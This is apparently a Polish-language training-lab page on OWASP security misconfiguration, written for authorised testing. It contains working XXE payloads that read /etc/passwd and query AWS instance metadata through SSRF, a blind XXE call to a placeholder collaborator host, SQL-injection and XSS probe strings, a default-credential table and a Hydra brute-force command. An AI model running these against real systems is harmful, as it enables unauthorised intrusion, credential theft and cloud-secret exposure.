---
title: A05 — Security Misconfiguration
sidebar_position: 5
tags: [lab, owasp-a05, nikto, xxe, directory-listing]
---

# A05 — Security Misconfiguration

## Zakres laboratorium

- Skanowanie Nikto — automatyczne wykrywanie typowych błędów konfiguracji
- Listowanie katalogów — odkrywanie ujawnionych indeksów plików
- Iniekcja XXE — odczytywanie lokalnych plików i wyzwalanie SSRF przez XML
- Szczegółowe komunikaty błędów — wyciek informacji poprzez odpowiedzi błędów
- Domyślne dane uwierzytelniające — automatyczne testowanie za pomocą Hydra

## Konfiguracja

```bash
TARGET="http://TARGET_IP_OR_DOMAIN"
PORT="80"
```

## Ćwiczenie 1: Skan Nikto

Uruchom pełny skan Nikto na celu:

```bash
nikto -h "$TARGET" -p "$PORT" -output nikto_results.txt
```

Nikto sprawdza: przestarzałe wersje oprogramowania, niebezpieczne metody HTTP (PUT, DELETE), pliki domyślne, błędy konfiguracji i znane podatności.

## Ćwiczenie 2: Wykrywanie listowania katalogów

Przetestuj 13 typowych ścieżek pod kątem włączonego listowania katalogów:

```bash
PATHS=(
  "/"
  "/uploads/"
  "/files/"
  "/backup/"
  "/images/"
  "/static/"
  "/assets/"
  "/logs/"
  "/data/"
  "/tmp/"
  "/config/"
  "/.git/"
  "/.svn/"
)

for PATH_CHECK in "${PATHS[@]}"; do
  RESPONSE=$(curl -s "$TARGET$PATH_CHECK")
  if echo "$RESPONSE" | grep -qi "Index of"; then
    echo "[DIRECTORY LISTING] $TARGET$PATH_CHECK"
  fi
done
```

Odpowiedź zawierająca „Index of" wskazuje, że listowanie katalogów jest włączone — błąd konfiguracji ujawniający strukturę plików i potencjalnie wrażliwe pliki.

## Ćwiczenie 3: Iniekcja XXE

XXE (XML External Entity) to atak na parsery XML, które przetwarzają deklaracje zewnętrznych encji.

### Podstawowe XXE — odczyt lokalnego pliku

```bash
XXE_PAYLOAD='<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>'

curl -s -X POST "$TARGET/api/xml" \
  -H "Content-Type: application/xml" \
  -d "$XXE_PAYLOAD"
```

### Blind XXE przez DNS out-of-band

```bash
BLIND_XXE='<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "http://YOUR_COLLABORATOR_SERVER/xxe-test">
]>
<data>&xxe;</data>'
```

### XXE do SSRF — dostęp do metadanych AWS

```bash
AWS_XXE='<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&ssrf;</foo>'

curl -s -X POST "$TARGET/api/xml" \
  -H "Content-Type: application/xml" \
  -d "$AWS_XXE"
```

Jeśli odpowiedź zawiera metadane AWS (identyfikator instancji, AMI ID itp.), aplikacja jest podatna na XXE i ma dostęp do usługi metadanych chmury.

## Ćwiczenie 4: Szczegółowe komunikaty błędów

Wywołaj warunki błędów, aby sprawdzić wyciek informacji:

```bash
ERROR_PATHS=(
  "/nonexistent-page-xyz"
  "/api/user/-1"
  "/api/user/abc"
  "/'OR'1'='1"
  "/<script>alert(1)</script>"
  "/api/user/%00"
  "/api/user/99999999"
  "/.env"
  "/config.php"
  "/web.config"
  "/app/config/parameters.yml"
  "/etc/passwd"
  "/?debug=true"
  "/?XDEBUG_SESSION_START=phpstorm"
  "/phpinfo.php"
  "/server-status"
)

for ERROR_PATH in "${ERROR_PATHS[@]}"; do
  RESPONSE=$(curl -s "$TARGET$ERROR_PATH")
  echo "--- $ERROR_PATH ---"
  echo "$RESPONSE" | grep -iE "error|exception|stack trace|at line|Warning:|Notice:" | head -3
done
```

Podatności: ślady stosu, wewnętrzne ścieżki plików, ciągi połączeń z bazą danych, wersje frameworków, komunikaty PHP.

## Ćwiczenie 5: Domyślne dane uwierzytelniające

### Ręczna lista testów

Przetestuj te pary danych uwierzytelniających na endpointach logowania:

| Nazwa użytkownika | Hasło |
|-------------------|-------|
| admin | admin |
| admin | password |
| admin | 123456 |
| root | root |
| root | toor |
| administrator | administrator |
| test | test |
| guest | guest |
| admin | (puste) |

### Automatyczne testowanie za pomocą Hydra

```bash
hydra -L /usr/share/wordlists/metasploit/unix_users.txt \
      -P /usr/share/wordlists/metasploit/unix_passwords.txt \
      -t 4 \
      "$TARGET" http-post-form \
      "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

:::warning
Ataki brute-force generują liczne wpisy w logach i mogą powodować blokady kont. Zawsze potwierdź posiadanie autoryzacji przed uruchomieniem automatycznych testów danych uwierzytelniających.
:::
